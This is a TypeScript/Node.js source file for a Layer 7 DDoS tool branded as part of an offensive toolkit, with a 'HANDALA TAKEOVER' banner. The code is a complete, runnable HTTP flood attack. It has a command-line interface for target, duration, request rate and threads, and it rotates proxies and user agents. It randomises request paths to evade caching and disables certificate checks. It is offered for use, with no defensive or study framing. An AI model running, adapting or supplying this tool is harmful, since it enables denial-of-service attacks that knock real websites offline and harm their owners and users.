/**
 * ITS L7 DDoS Tool - Advanced Layer 7 Attack Tool
 * WHOAMISec Offensive Security Toolkit
 * TypeScript/Node.js Implementation
 */

import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';
import axios, { AxiosResponse } from 'axios';
import { URL } from 'url';
import * as fs from 'fs';
import * as path from 'path';

interface AttackConfig {
  target: string;
  duration: number;
  rps: number;
  threads: number;
  proxyFile?: string;
}

interface AttackStats {
  successCount: number;
  failCount: number;
  startTime: number;
  endTime?: number;
}

class ITSL7DDoS {
  private config: AttackConfig;
  private proxies: string[] = [];
  private userAgents: string[] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
  ];

  constructor(config: AttackConfig) {
    this.config = config;
    this.loadProxies();
  }

  private loadProxies(): void {
    if (this.config.proxyFile && fs.existsSync(this.config.proxyFile)) {
      const proxyData = fs.readFileSync(this.config.proxyFile, 'utf-8');
      this.proxies = proxyData.split('\n').filter(line => line.trim() !== '');
      console.log(`[+] Loaded ${this.proxies.length} proxies`);
    }
  }

  private generateRandomString(length: number = 10): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private generateRandomPath(): string {
    const paths = [
      `/${this.generateRandomString()}`,
      `/${this.generateRandomString()}.php`,
      `/${this.generateRandomString()}.html`,
      `/${this.generateRandomString()}.jpg`,
      `/${this.generateRandomString()}.css`,
      `/${this.generateRandomString()}.js`,
      `/admin/${this.generateRandomString()}`,
      `/api/${this.generateRandomString()}`,
      `/wp-content/${this.generateRandomString()}`,
      `/images/${this.generateRandomString()}.jpg`
    ];
    return paths[Math.floor(Math.random() * paths.length)];
  }

  private getRandomUserAgent(): string {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  private getRandomProxy(): string | null {
    if (this.proxies.length === 0) return null;
    return this.proxies[Math.floor(Math.random() * this.proxies.length)];
  }

  private async sendHTTPRequest(): Promise<boolean> {
    try {
      const randomPath = this.generateRandomPath();
      const url = new URL(this.config.target);
      url.pathname = randomPath;

      const headers = {
        'User-Agent': this.getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
      };

      const proxy = this.getRandomProxy();
      const proxyConfig = proxy ? {
        host: proxy.split(':')[0],
        port: parseInt(proxy.split(':')[1]) || 8080
      } : undefined;

      const response = await axios.get(url.toString(), {
        headers,
        timeout: 10000,
        httpsAgent: proxyConfig ? new (require('https').Agent)({ ...proxyConfig, rejectUnauthorized: false }) : undefined,
        httpAgent: proxyConfig ? new (require('http').Agent)(proxyConfig) : undefined,
        maxRedirects: 0,
        validateStatus: (status: number) => [200, 301, 302, 403, 404].includes(status)
      });

      return [200, 301, 302, 403, 404].includes(response.status);
    } catch (error) {
      return false;
    }
  }

  private async attackThread(stats: AttackStats): Promise<void> {
    const endTime = Date.now() + (this.config.duration * 1000);
    
    while (Date.now() < endTime) {
      const success = await this.sendHTTPRequest();
      if (success) {
        stats.successCount++;
      } else {
        stats.failCount++;
      }
      
      // Rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000 / this.config.rps));
    }
  }

  public async startAttack(): Promise<any> {
    console.log(`
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ✋✋✋ ITS L7 DDoS ATTACK TOOL - HANDALA TAKEOVER ✋✋✋                                   ║
║  █     █░▓█████  ██▀███   ███▄ ▄███▓▓█████  ██▓███   ▄▄▄█████▓░██████╗ ██╗          ║
║  ▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒▒██    ▒ ▒██║          ║
║  ▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒███   ▓██░ ██▓▒▒ ▓██░ ▒░░ ▓██▄   ░██║          ║
║  ░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░   ▒   ██▒░██║          ║
║  ░░██▒██▓ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒██████▒▒░██║          ║
║  ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░▓  ║
║    ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ░ ░  ░░▒ ░         ░    ░  ░▒  ░ ░ ▒ ░║
║    ░   ░     ░     ░░   ░ ░      ░      ░   ░░         ░ ░    ░  ░  ░   ▒ ░║
║      ░       ░  ░   ░            ░      ░  ░                       ░   ░   ║
║                                                                           ║
║        ITS L7 DDoS TOOL - ADVANCED LAYER 7 ATTACK SYSTEM                 ║
║   HTTP/2 Support | Proxy Rotation | Advanced Evasion                      ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
    `);

    console.log(`[+] Target: ${this.config.target}`);
    console.log(`[+] Duration: ${this.config.duration}s`);
    console.log(`[+] RPS: ${this.config.rps}`);
    console.log(`[+] Threads: ${this.config.threads}`);
    console.log(`[+] Proxies: ${this.proxies.length}`);
    console.log(`[+] Attack started at: ${new Date().toISOString()}`);
    console.log("=".repeat(80));

    const stats: AttackStats = {
      successCount: 0,
      failCount: 0,
      startTime: Date.now()
    };

    // Create worker threads
    const workers: Promise<void>[] = [];
    
    for (let i = 0; i < this.config.threads; i++) {
      workers.push(this.attackThread(stats));
    }

    // Monitor progress
    const monitorInterval = setInterval(() => {
      const elapsed = (Date.now() - stats.startTime) / 1000;
      process.stdout.write(`\r[+] Elapsed: ${elapsed.toFixed(0)}s | Success: ${stats.successCount} | Failed: ${stats.failCount}`);
    }, 1000);

    // Wait for all threads to complete
    await Promise.all(workers);
    
    clearInterval(monitorInterval);
    stats.endTime = Date.now();

    console.log("\n" + "=".repeat(80));
    console.log("[+] Attack completed!");
    console.log(`[+] Total Success: ${stats.successCount}`);
    console.log(`[+] Total Failed: ${stats.failCount}`);
    
    const totalRequests = stats.successCount + stats.failCount;
    const successRate = totalRequests > 0 ? (stats.successCount / totalRequests) * 100 : 0;
    console.log(`[+] Success Rate: ${successRate.toFixed(2)}%`);

    return {
      success: true,
      target: this.config.target,
      duration: this.config.duration,
      threads: this.config.threads,
      successCount: stats.successCount,
      failCount: stats.failCount,
      successRate: successRate
    };
  }
}

// CLI Interface
if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.length < 4) {
    console.log('Usage: node its-l7-ddos.js <target> <duration> <rps> <threads> [proxyFile]');
    process.exit(1);
  }

  const config: AttackConfig = {
    target: args[0],
    duration: parseInt(args[1]),
    rps: parseInt(args[2]),
    threads: parseInt(args[3]),
    proxyFile: args[4]
  };

  const attacker = new ITSL7DDoS(config);
  
  attacker.startAttack()
    .then(result => {
      console.log(JSON.stringify({
        tool: "its-l7-ddos",
        timestamp: new Date().toISOString(),
        status: "completed",
        result: result
      }, null, 2));
    })
    .catch(error => {
      console.error('Error:', error);
      process.exit(1);
    });
}

export { ITSL7DDoS };